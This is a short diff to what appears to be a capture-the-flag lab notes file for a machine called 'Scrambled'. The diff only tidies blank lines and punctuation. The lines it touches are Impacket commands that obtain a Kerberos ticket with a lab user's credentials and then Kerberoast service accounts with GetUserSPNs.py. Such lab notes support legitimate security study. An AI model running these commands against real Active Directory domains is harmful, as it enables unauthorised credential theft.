@@ -431,13 +431,10 @@ Used in ```Scrambled```
 
 ```shell
 python3 getTGT.py scrm.local/ksimpson:ksimpson -k -dc-ip 10.10.11.168
-
 export KRB5CCNAME=ksimpson.ccache
-
 klist
-
 python3 GetUserSPNs.py scrm.local/ksimpson:ksimpson -dc-ip 10.10.11.168 -dc-host dc1.scrm.local -k -request
-# -k Use Kerberos authentication. 
+# -k Use Kerberos authentication 
 ```
 
 host machine
